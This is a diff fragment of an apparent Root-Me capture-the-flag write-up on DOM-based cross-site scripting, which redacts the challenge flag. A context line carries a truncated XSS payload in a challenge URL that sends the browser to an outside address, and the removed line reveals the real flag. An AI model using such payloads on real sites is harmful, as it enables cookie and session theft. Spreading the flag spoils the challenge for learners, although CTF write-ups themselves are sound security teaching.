@@ -283,7 +283,7 @@ http://challenge01.root-me.org/web-client/ch32/?number=42';document.location='ht
 
 ![flag](/images/2026-03-16-19-03-52.png)
 
-🏁 `c=flag=rootme{XSS_D0M_BaSed_InTr0}`
+🏁 `c=flag=rootme{XXXXXXXXXXXXX}`
 
 ![Validation](/images/2026-03-16-19-11-13.png)
 
